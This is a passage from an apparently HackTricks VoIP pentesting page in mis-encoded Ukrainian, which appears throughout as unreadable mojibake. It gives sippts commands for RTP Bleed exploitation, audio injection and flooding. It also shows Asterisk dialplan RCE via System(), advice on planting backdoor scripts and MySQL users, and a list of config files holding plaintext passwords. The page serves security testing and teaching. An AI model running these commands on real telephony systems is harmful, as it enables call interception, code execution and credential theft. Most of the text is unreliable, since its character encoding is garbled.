RTP-—Ç—Ä–∞—Ñ—ñ–∫, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –∞–±–æ–Ω–µ–Ω—Ç–∞ –∞–±–æ –∞–±–æ–Ω–µ–Ω—Ç–∫–∏ –ø–æ—Ç–æ—á–Ω–æ–≥–æ RTP-–ø–æ—Ç–æ–∫—É. –ú–∏ –Ω–∞–∑–∏–≤–∞—î–º–æ —Ü—é —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å RTP Bleed, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ RTP –º–µ–¥—ñ–∞-–ø–æ—Ç–æ–∫–∏, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω—ñ –¥–ª—è –∑–∞–∫–æ–Ω–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤.

–©–µ –æ–¥–Ω–∞ —Ü—ñ–∫–∞–≤–∞ –ø–æ–≤–µ–¥—ñ–Ω–∫–∞ RTP-–ø—Ä–æ–∫—Å—ñ —Ç–∞ —Å—Ç–µ–∫—ñ–≤ RTP –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ —ñ–Ω–æ–¥—ñ, **–Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –Ω–µ –≤—Ä–∞–∑–ª–∏–≤—ñ –¥–æ RTP Bleed**, –≤–æ–Ω–∏ **–ø—Ä–∏–π–º–∞—é—Ç—å, –ø–µ—Ä–µ—Å–∏–ª–∞—é—Ç—å —Ç–∞/–∞–±–æ –æ–±—Ä–æ–±–ª—è—é—Ç—å RTP-–ø–∞–∫–µ—Ç–∏ –∑ –±—É–¥—å-—è–∫–æ–≥–æ –¥–∂–µ—Ä–µ–ª–∞**. –¢–æ–º—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ RTP-–ø–∞–∫–µ—Ç–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –¥–æ–∑–≤–æ–ª–∏—Ç–∏ —ó–º —ñ–Ω–∂–µ–∫—Ç—É–≤–∞—Ç–∏ —Å–≤–æ—î –º–µ–¥—ñ–∞ –∑–∞–º—ñ—Å—Ç—å –∑–∞–∫–æ–Ω–Ω–æ–≥–æ. –ú–∏ –Ω–∞–∑–∏–≤–∞—î–º–æ —Ü—é –∞—Ç–∞–∫—É RTP injection, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ –¥–æ–∑–≤–æ–ª—è—î —ñ–Ω–∂–µ–∫—Ü—ñ—é –Ω–µ–ª–µ–≥—ñ—Ç–∏–º–Ω–∏—Ö RTP-–ø–∞–∫–µ—Ç—ñ–≤ —É —ñ—Å–Ω—É—é—á—ñ RTP-–ø–æ—Ç–æ–∫–∏. –¶—è —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –º–æ–∂–µ –±—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–∞ —è–∫ —É RTP-–ø—Ä–æ–∫—Å—ñ, —Ç–∞–∫ —ñ –≤ –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–∫–∞—Ö.

Asterisk —Ç–∞ FreePBX —Ç—Ä–∞–¥–∏—Ü—ñ–π–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏ **–Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è `NAT=yes`**, —è–∫–µ –¥–æ–∑–≤–æ–ª—è—î RTP-—Ç—Ä–∞—Ñ—ñ–∫—É –æ–±—Ö–æ–¥–∏—Ç–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –≤—ñ–¥—Å—É—Ç–Ω–æ—Å—Ç—ñ –∑–≤—É–∫—É –∞–±–æ –æ–¥–Ω–æ—Å—Ç–æ—Ä–æ–Ω–Ω—å–æ–≥–æ –∑–≤—É–∫—É –ø—ñ–¥ —á–∞—Å –¥–∑–≤—ñ–Ω–∫—ñ–≤.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** –∑ [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed –≤–∏—è–≤–ª—è—î —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å RTP Bleed, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ RTP-–ø–æ—Ç–æ–∫–∏.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** –∑ [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed –≤–∏—è–≤–ª—è—î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å RTP Bleed, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ RTCP –ø–æ—Ç–æ–∫–∏.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** –∑ [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood –µ–∫—Å–ø–ª—É–∞—Ç—É—î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å RTP Bleed, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ RTP –ø–æ—Ç–æ–∫–∏.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** –∑ [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject –µ–∫—Å–ø–ª—É–∞—Ç—É—î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å RTP Bleed, —ñ–Ω–∂–µ–∫—Ç—É—é—á–∏ –∞—É–¥—ñ–æ—Ñ–∞–π–ª (—Ñ–æ—Ä–º–∞—Ç WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

–í Asterisk –≤–∏ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º –º–æ–∂–µ—Ç–µ **–¥–æ–¥–∞—Ç–∏ –ø—Ä–∞–≤–∏–ª–∞ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è —Ç–∞ –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —ó—Ö** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–ª–∞–º–∞–≤—à–∏ –≤—Ä–∞–∑–ª–∏–≤–∏–π –≤–µ–±-–º–µ–Ω–µ–¥–∂–µ—Ä —Å–µ—Ä–≤–µ—Ä), –º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–æ–º–∞–Ω–¥—É **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
There is command called **`Shell`** that could be used **instead of `System`** to execute system commands if necessary.

{% hint style="warning" %}
–Ø–∫—â–æ —Å–µ—Ä–≤–µ—Ä **–Ω–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø–µ–≤–Ω–∏—Ö —Å–∏–º–≤–æ–ª—ñ–≤** —É –∫–æ–º–∞–Ω–¥—ñ **`System`** (—è–∫ —É Elastix), –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –¥–æ–∑–≤–æ–ª—è—î –≤–µ–±-—Å–µ—Ä–≤–µ—Ä **—è–∫–æ—Å—å —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–∏—Å—Ç–µ–º–∏** (—è–∫ —É Elastix –∞–±–æ trixbox), —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ —Ü–µ, —â–æ–± **—Å—Ç–≤–æ—Ä–∏—Ç–∏ —Å–∫—Ä–∏–ø—Ç –∑ –±–µ–∫–¥–æ—Ä–æ–º**, –∞ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ **`System`** –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è** —Ü—å–æ–≥–æ **—Å–∫—Ä–∏–ø—Ç—É**.
{% endhint %}

#### –¶—ñ–∫–∞–≤—ñ –ª–æ–∫–∞–ª—å–Ω—ñ —Ñ–∞–π–ª–∏ —Ç–∞ –¥–æ–∑–≤–æ–ª–∏

* **`sip.conf`** -> –ú—ñ—Å—Ç–∏—Ç—å –ø–∞—Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ SIP.
* –Ø–∫—â–æ **—Å–µ—Ä–≤–µ—Ä Asterisk –ø—Ä–∞—Ü—é—î –ø—ñ–¥ root**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ root.
* **mysql root user** –º–æ–∂–µ **–Ω–µ –º–∞—Ç–∏ –∂–æ–¥–Ω–æ–≥–æ –ø–∞—Ä–æ–ª—è**.
* —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ mysql —è–∫ –±–µ–∫–¥–æ—Ä.
* **`FreePBX`**
* **`amportal.conf`** -> –ú—ñ—Å—Ç–∏—Ç—å –ø–∞—Ä–æ–ª—å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –≤–µ–±-–ø–∞–Ω–µ–ª—ñ (FreePBX).
* **`FreePBX.conf`** -> –ú—ñ—Å—Ç–∏—Ç—å –ø–∞—Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ FreePBXuser, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.
* —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ mysql —è–∫ –±–µ–∫–¥–æ—Ä.
* **`Elastix`**
* **`Elastix.conf`** -> –ú—ñ—Å—Ç–∏—Ç—å –∫—ñ–ª—å–∫–∞ –ø–∞—Ä–æ–ª—ñ–≤ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ, —Ç–∞–∫–∏—Ö —è–∫ –ø–∞—Ä–æ–ª—å mysql root, –ø–∞—Ä–æ–ª—å IMAPd, –ø–∞—Ä–æ–ª—å –≤–µ–±-–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞.
* **–ö—ñ–ª—å–∫–∞ –ø–∞–ø–æ–∫** –Ω–∞–ª–µ–∂–∞—Ç–∏–º—É—Ç—å —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É asterisk (—è–∫—â–æ –Ω–µ –ø—Ä–∞—Ü—é—î –ø—ñ–¥ root). –¶–µ–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ —á–∏—Ç–∞—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ —Ñ–∞–π–ª–∏ —Ç–∞ —Ç–∞–∫–æ–∂ –∫–æ–Ω—Ç—Ä–æ–ª—é—î –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é, —Ç–æ–º—É –≤—ñ–Ω –º–æ–∂–µ –∑–º—É—Å–∏—Ç–∏ Asterisk –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —ñ–Ω—à—ñ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω—ñ –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏ –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è.

### RTP Injection

–ú–æ–∂–ª–∏–≤–æ –≤—Å—Ç–∞–≤–∏—Ç–∏ **`.wav`** —É —Ä–æ–∑–º–æ–≤–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) —Ç–∞ **`rtpmixsound`** (`sudo apt install rtpmixsound`).

–ê–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Å–∫—Ä–∏–ø—Ç–∏ –∑ [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) –¥–ª—è **—Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è —Ä–æ–∑–º–æ–≤** (**`rtpscan.pl`**), –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ `.wav` —É —Ä–æ–∑–º–æ–≤—É (**`rtpsend.pl`**) —Ç–∞ **–≤—Å—Ç–∞–≤–∫–∏ —à—É–º—É** —É —Ä–æ–∑–º–æ–≤—É (**`rtpflood.pl`**).

### DoS

–Ü—Å–Ω—É—î –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –¥–æ—Å—è–≥—Ç–∏ DoS –Ω–∞ VoIP —Å–µ—Ä–≤–µ—Ä–∞—Ö.

* **`SIPPTS flood`** –∑ [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood –Ω–∞–¥—Å–∏–ª–∞—î –Ω–µ–æ–±–º–µ–∂–µ–Ω—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å –¥–æ —Ü—ñ–ª—ñ.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** –∑ [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping —Ä–æ–±–∏—Ç—å SIP ping, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —á–∞—Å –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —Å–µ—Ä–≤–µ—Ä–∞.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS IAX –ø—Ä–æ—Ç–æ–∫–æ–ª, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è Asterisk.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è SIP/SDP INVITE –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å –Ω–∞ UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): –ù–∞–¥—Å–∏–ª–∞—î –∫—ñ–ª—å–∫–∞ –¥–æ–±—Ä–µ —Å—Ñ–æ—Ä–º–æ–≤–∞–Ω–∏—Ö RTP –ø–∞–∫–µ—Ç—ñ–≤. –ü–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞—Ç–∏ RTP –ø–æ—Ä—Ç–∏, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è (—Å–ø–æ—á–∞—Ç–∫—É –ø—Ä–æ—Å–ª—É—Ö–∞–π—Ç–µ).
* [**SIPp**](https://github.com/SIPp/sipp): –î–æ–∑–≤–æ–ª—è—î –∞–Ω–∞–ª—ñ–∑—É–≤–∞—Ç–∏ —Ç–∞ –≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ SIP —Ç—Ä–∞—Ñ—ñ–∫, —Ç–æ–º—É –π–æ–≥–æ —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP —à–≤–µ–π—Ü–∞—Ä—Å—å–∫–∏–π –Ω—ñ–∂. –¢–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è SIP –∞—Ç–∞–∫.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### OS Vulnerabilities

–ù–∞–π–ø—Ä–æ—Å—Ç—ñ—à–∏–π —Å–ø–æ—Å—ñ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–Ω–µ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è, —Ç–∞–∫–µ —è–∫ Asterisk, - —Ü–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ **–¥–∏—Å—Ç—Ä–∏–±—É—Ç–∏–≤ –û–°**, —è–∫–∏–π –≤–∂–µ –º–∞—î –π–æ–≥–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–º, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥: **FreePBX, Elastix, Trixbox**... –ü—Ä–æ–±–ª–µ–º–∞ –∑ —Ü–∏–º–∏ –¥–∏—Å—Ç—Ä–∏–±—É—Ç–∏–≤–∞–º–∏ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ, —è–∫ —Ç—ñ–ª—å–∫–∏ –≤–æ–Ω–∏ –∑–∞–ø—Ä–∞—Ü—é—é—Ç—å, —Å–∏—Å—Ç–µ–º–Ω—ñ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏ –º–æ–∂—É—Ç—å **–±—ñ–ª—å—à–µ –Ω–µ –æ–Ω–æ–≤–ª—é–≤–∞—Ç–∏ —ó—Ö**, —ñ **–≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ** –±—É–¥—É—Ç—å –≤–∏—è–≤–ª–µ–Ω—ñ –∑ —á–∞—Å–æ–º.

## References

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
